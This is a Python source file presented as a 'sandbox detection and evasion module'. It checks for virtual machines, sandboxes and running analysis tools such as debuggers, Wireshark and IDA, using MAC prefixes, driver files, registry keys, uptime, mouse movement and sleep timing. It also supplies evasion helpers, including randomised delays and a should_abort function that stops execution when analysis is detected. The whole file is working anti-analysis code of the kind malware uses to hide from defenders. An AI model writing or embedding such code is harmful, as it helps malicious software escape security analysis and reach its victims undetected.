#!/usr/bin/env python3
"""
Sandbox detection and evasion module.
Detects virtual machines, sandboxes, and analysis environments.
"""

import ctypes
import os
import platform
import random
import subprocess
import sys
import time
from typing import Dict, List, Optional, Tuple


class SandboxDetector:
    """
    Detect if running in sandbox, VM, or analysis environment.
    Multiple detection vectors for redundancy.
    """

    def __init__(self):
        self.is_windows = platform.system() == "Windows"
        self.detected = False
        self.detection_reason = ""

        # VM MAC address prefixes
        self.vm_macs = [
            "00:05:69",  # VMware
            "00:0C:29",  # VMware
            "00:1C:14",  # VMware
            "00:50:56",  # VMware
            "08:00:27",  # VirtualBox
            "0A:00:27",  # VirtualBox
            "0C:D2:92",  # Hyper-V
            "00:03:FF",  # Microsoft Hyper-V
            "00:1C:42",  # Parallels
            "00:16:3E",  # Xen
            "00:25:90",  # Apple Virtualization
        ]

        # Sandbox/analysis artifacts
        self.sandbox_files = [
            r"C:\Windows\System32\drivers\vmmouse.sys",
            r"C:\Windows\System32\drivers\vmhgfs.sys",
            r"C:\Windows\System32\drivers\vmci.sys",
            r"C:\Windows\System32\drivers\vmkbd.sys",
            r"C:\Windows\System32\drivers\pvscsi.sys",
            r"C:\Windows\System32\drivers\vboxmouse.sys",
            r"C:\Windows\System32\drivers\vboxguest.sys",
            r"C:\Windows\System32\drivers\vboxsf.sys",
            r"C:\Windows\System32\drivers\xenbus.sys",
            r"C:\Windows\System32\drivers\xennet.sys",
            r"C:\Windows\System32\drivers\xenvif.sys",
            r"C:\Windows\System32\vmguestlib.dll",
            r"C:\Windows\System32\vmhgfs.dll",
            r"C:\Windows\System32\vmhgfsCore.dll",
        ]

        self.sandbox_processes = [
            "vmsrvc.exe",
            "vmusrvc.exe",
            "vmtoolsd.exe",
            "vmwaretray.exe",
            "vmwareuser.exe",
            "VBoxTray.exe",
            "VBoxService.exe",
            "xenservice.exe",
            "qemu-ga.exe",
            "joeboxserver.exe",
            "joeboxcontrol.exe",
            "VBoxControl.exe",
            "vboxservice.exe",
            "df5serv.exe",  # Deep Freeze
            "vboxtray.exe",
        ]

        self.analysis_processes = [
            "procmon.exe",
            "procmon64.exe",
            "procexp.exe",
            "procexp64.exe",
            "tcpview.exe",
            "tcpview64.exe",
            "wireshark.exe",
            "dumpcap.exe",
            "ida.exe",
            "ida64.exe",
            "ollydbg.exe",
            "x64dbg.exe",
            "x32dbg.exe",
            "windbg.exe",
            "immunitydebugger.exe",
            "fiddler.exe",
            "httpdebugger.exe",
            "devenv.exe",
            "cheatengine.exe",
            "frida.exe",
            "radare2.exe",
            "cutter.exe",
            "ghidra.exe",
            "dnspy.exe",
            "detectiteasy.exe",
            "pestudio.exe",
            "exeinfope.exe",
        ]

    def run_all_checks(self) -> Tuple[bool, str]:
        """Run all detection checks."""
        checks = [
            ("MAC_Address", self.check_mac_address),
            ("VM_Files", self.check_vm_files),
            ("VM_Processes", self.check_vm_processes),
            ("CPU_Cores", self.check_cpu_cores),
            ("RAM_Size", self.check_ram_size),
            ("Screen_Resolution", self.check_screen_resolution),
            ("Username", self.check_username),
            ("Hostname", self.check_hostname),
            ("Uptime", self.check_uptime),
            ("Sleep_Speedup", self.check_sleep_acceleration),
            ("Mouse_Activity", self.check_mouse_activity),
            ("Disk_Size", self.check_disk_size),
            ("BIOS_Info", self.check_bios_info),
            ("Registry_Keys", self.check_registry_keys),
            ("Analysis_Tools", self.check_analysis_tools),
        ]

        for check_name, check_func in checks:
            try:
                if check_func():
                    self.detected = True
                    self.detection_reason = check_name
                    return True, check_name
            except Exception as e:
                # Silent fail - don't leak detection method
                pass

        return False, ""

    def check_mac_address(self) -> bool:
        """Check for VM MAC address prefixes."""
        if not self.is_windows:
            return False

        try:
            result = subprocess.run(
                ["getmac", "/FO", "CSV", "/NH", "/V"],
                capture_output=True,
                text=True,
                timeout=5
            )

            if result.returncode == 0:
                for line in result.stdout.splitlines():
                    parts = line.split(",")
                    if len(parts) >= 2:
                        mac = parts[1].strip().replace('"', '').replace("-", ":")
                        for prefix in self.vm_macs:
                            if mac.upper().startswith(prefix.upper()):
                                return True

            return False
        except Exception:
            return False

    def check_vm_files(self) -> bool:
        """Check for VM-specific files."""
        for filepath in self.sandbox_files:
            try:
                if os.path.exists(filepath):
                    return True
            except Exception:
                pass

        return False

    def check_vm_processes(self) -> bool:
        """Check for VM service processes."""
        if not self.is_windows:
            return False

        try:
            result = subprocess.run(
                ["tasklist", "/FO", "CSV", "/NH"],
                capture_output=True,
                text=True,
                timeout=5
            )

            if result.returncode == 0:
                process_list = result.stdout.lower()
                for proc in self.sandbox_processes:
                    if proc.lower() in process_list:
                        return True

            return False
        except Exception:
            return False

    def check_cpu_cores(self, threshold: int = 2) -> bool:
        """Check if CPU has few cores (suspicious)."""
        try:
            cpu_count = os.cpu_count()
            if cpu_count and cpu_count <= threshold:
                return True
        except Exception:
            pass

        return False

    def check_ram_size(self, threshold_mb: int = 4096) -> bool:
        """Check if RAM is suspiciously low."""
        if not self.is_windows:
            return False

        try:
            kernel32 = ctypes.windll.kernel32

            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [
                    ("dwLength", ctypes.c_uint32),
                    ("dwMemoryLoad", ctypes.c_uint32),
                    ("ullTotalPhys", ctypes.c_ulonglong),
                    ("ullAvailPhys", ctypes.c_ulonglong),
                    ("ullTotalPageFile", ctypes.c_ulonglong),
                    ("ullAvailPageFile", ctypes.c_ulonglong),
                    ("ullTotalVirtual", ctypes.c_ulonglong),
                    ("ullAvailVirtual", ctypes.c_ulonglong),
                    ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
                ]

            mem = MEMORYSTATUSEX()
            mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)

            if kernel32.GlobalMemoryStatusEx(ctypes.byref(mem)):
                total_mb = mem.ullTotalPhys // (1024 * 1024)
                if total_mb < threshold_mb:
                    return True

        except Exception:
            pass

        return False

    def check_screen_resolution(self, min_width: int = 800, min_height: int = 600) -> bool:
        """Check if screen resolution is suspicious."""
        if not self.is_windows:
            return False

        try:
            user32 = ctypes.windll.user32
            width = user32.GetSystemMetrics(0)
            height = user32.GetSystemMetrics(1)

            if width < min_width or height < min_height:
                return True

        except Exception:
            pass

        return False

    def check_username(self) -> bool:
        """Check for sandbox/analysis usernames."""
        suspicious_users = [
            "sandbox",
            "vmware",
            "virtualbox",
            "test",
            "user",
            "admin",
            "john doe",
            "currentuser",
            "johnson",
            "miller",
            "malware",
            "virus",
            "john",
            "honey",
            "cuckoo",
            "analysis",
            "analyzer",
            "fortinet",
            "fortiedr",
        ]

        try:
            username = os.environ.get("USERNAME", "").lower()
            for user in suspicious_users:
                if user in username:
                    return True
        except Exception:
            pass

        return False

    def check_hostname(self) -> bool:
        """Check for sandbox/analysis hostnames."""
        suspicious_hosts = [
            "sandbox",
            "cuckoo",
            "virustotal",
            "malware",
            "analysis",
            "vmware",
            "virtualbox",
            "test-",
            "john-",
            "honey",
            "fortinet",
        ]

        try:
            hostname = platform.node().lower()
            for host in suspicious_hosts:
                if host in hostname:
                    return True
        except Exception:
            pass

        return False

    def check_uptime(self, min_seconds: int = 300) -> bool:
        """Check if system uptime is suspiciously low."""
        if not self.is_windows:
            return False

        try:
            kernel32 = ctypes.windll.kernel32
            uptime_ms = kernel32.GetTickCount64()
            uptime_sec = uptime_ms // 1000

            if uptime_sec < min_seconds:
                return True

        except Exception:
            pass

        return False

    def check_sleep_acceleration(self) -> bool:
        """
        Detect if sleep calls are accelerated (sandbox time manipulation).
        """
        sleep_time = 2.0  # seconds

        start = time.perf_counter()
        time.sleep(sleep_time)
        elapsed = time.perf_counter() - start

        # If we woke up way too early, sandbox is accelerating time
        if elapsed < sleep_time * 0.8:
            return True

        return False

    def check_mouse_activity(self, duration: int = 3) -> bool:
        """
        Check if mouse has moved during duration.
        Sandboxes often have no mouse activity.
        """
        if not self.is_windows:
            return False

        try:
            user32 = ctypes.windll.user32

            # Get initial position
            class POINT(ctypes.Structure):
                _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

            point = POINT()
            user32.GetCursorPos(ctypes.byref(point))
            start_x, start_y = point.x, point.y

            # Wait
            time.sleep(duration)

            # Check if moved
            user32.GetCursorPos(ctypes.byref(point))
            end_x, end_y = point.x, point.y

            # No movement = likely sandbox
            if start_x == end_x and start_y == end_y:
                return True

        except Exception:
            pass

        return False

    def check_disk_size(self, min_size_gb: int = 50) -> bool:
        """Check if disk size is suspiciously small."""
        try:
            if self.is_windows:
                import shutil
                total, used, free = shutil.disk_usage("C:\\")
                total_gb = total // (1024**3)
                if total_gb < min_size_gb:
                    return True

        except Exception:
            pass

        return False

    def check_bios_info(self) -> bool:
        """Check BIOS info for VM indicators."""
        if not self.is_windows:
            return False

        try:
            result = subprocess.run(
                ["wmic", "bios", "get", "manufacturer", "/value"],
                capture_output=True,
                text=True,
                timeout=5
            )

            if result.returncode == 0:
                output = result.stdout.lower()
                vm_indicators = [
                    "vmware", "virtualbox", "innotek",
                    "xen", "parallels", "microsoft corporation"
                ]
                for indicator in vm_indicators:
                    if indicator in output:
                        return True

        except Exception:
            pass

        return False

    def check_registry_keys(self) -> bool:
        """Check registry for VM/sandbox indicators."""
        if not self.is_windows:
            return False

        reg_checks = [
            r"HKLM\HARDWARE\DESCRIPTION\System\SystemBiosVersion",
            r"HKLM\SOFTWARE\VMware, Inc.\VMware Tools",
            r"HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions",
            r"HKLM\SYSTEM\CurrentControlSet\Services\VBoxGuest",
            r"HKLM\SYSTEM\CurrentControlSet\Services\VMTools",
            r"HKLM\SYSTEM\CurrentControlSet\Services\vmci",
            r"HKLM\SYSTEM\CurrentControlSet\Services\vmhgfs",
            r"HKLM\SYSTEM\CurrentControlSet\Services\vmx86",
            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\QEMU",
        ]

        for reg_path in reg_checks:
            try:
                result = subprocess.run(
                    ["reg", "query", reg_path],
                    capture_output=True,
                    timeout=3
                )
                if result.returncode == 0 and b"ERROR" not in result.stdout:
                    return True
            except Exception:
                pass

        return False

    def check_analysis_tools(self) -> bool:
        """Check for running analysis tools."""
        if not self.is_windows:
            return False

        try:
            result = subprocess.run(
                ["tasklist", "/FO", "CSV", "/NH"],
                capture_output=True,
                text=True,
                timeout=5
            )

            if result.returncode == 0:
                process_list = result.stdout.lower()
                for proc in self.analysis_processes:
                    if proc.lower() in process_list:
                        return True

        except Exception:
            pass

        return False


class EvasionTechniques:
    """
    Evasion techniques to avoid sandbox analysis.
    """

    @staticmethod
    def sleep_with_jitter(base_seconds: float = 5.0, jitter: float = 2.0):
        """Sleep with random jitter to evade timing-based detection."""
        sleep_time = base_seconds + random.uniform(-jitter, jitter)
        if sleep_time > 0:
            time.sleep(sleep_time)

    @staticmethod
    def require_interaction(prompt: str = "Press any key to continue...") -> bool:
        """Require user interaction to continue."""
        try:
            print(prompt)
            input()
            return True
        except (EOFError, KeyboardInterrupt):
            return False

    @staticmethod
    def check_internet_connection(timeout: int = 3) -> bool:
        """Check if internet is available (some sandboxes block it)."""
        import socket
        try:
            socket.setdefaulttimeout(timeout)
            socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(("8.8.8.8", 53))
            return True
        except Exception:
            return False

    @staticmethod
    def delay_execution(only_if_sandbox: bool = True):
        """Delay execution with multiple checks."""
        if only_if_sandbox:
            detector = SandboxDetector()
            if detector.run_all_checks()[0]:
                # Longer delay if sandbox detected
                time.sleep(random.uniform(30, 120))
            else:
                # Shorter delay otherwise
                time.sleep(random.uniform(2, 5))
        else:
            EvasionTechniques.sleep_with_jitter(10, 5)

    @staticmethod
    def check_running_processes_count(min_processes: int = 50) -> bool:
        """Check if enough processes are running (sandboxes often minimal)."""
        if os.name != 'nt':
            return True

        try:
            result = subprocess.run(
                ["tasklist"],
                capture_output=True,
                text=True,
                timeout=5
            )

            if result.returncode == 0:
                lines = [l for l in result.stdout.splitlines() if l.strip()]
                # Subtract header lines
                process_count = len(lines) - 2
                return process_count >= min_processes

        except Exception:
            pass

        return True


def should_abort() -> Tuple[bool, str]:
    """
    Quick check if we should abort due to sandbox/analysis.
    Returns (should_abort, reason)
    """
    detector = SandboxDetector()
    detected, reason = detector.run_all_checks()
    return detected, reason


if __name__ == "__main__":
    print("Sandbox Detection Test Suite")
    print("=" * 60)

    detector = SandboxDetector()
    detected, reason = detector.run_all_checks()

    print(f"Overall Detection: {'YES' if detected else 'NO'}")
    if detected:
        print(f"Detection Reason: {reason}")

    print("\nIndividual Checks:")
    print("-" * 60)

    checks = [
        ("MAC Address", detector.check_mac_address),
        ("VM Files", detector.check_vm_files),
        ("VM Processes", detector.check_vm_processes),
        ("CPU Cores", detector.check_cpu_cores),
        ("RAM Size", detector.check_ram_size),
        ("Screen Resolution", detector.check_screen_resolution),
        ("Username", detector.check_username),
        ("Hostname", detector.check_hostname),
        ("Uptime", detector.check_uptime),
        ("Sleep Speedup", detector.check_sleep_acceleration),
        ("Disk Size", detector.check_disk_size),
        ("BIOS Info", detector.check_bios_info),
        ("Registry Keys", detector.check_registry_keys),
        ("Analysis Tools", detector.check_analysis_tools),
    ]

    for name, func in checks:
        try:
            result = func()
            status = "DETECTED" if result else "CLEAR"
            print(f"{name:25} : {status}")
        except Exception as e:
            print(f"{name:25} : ERROR ({e})")

    print("=" * 60)
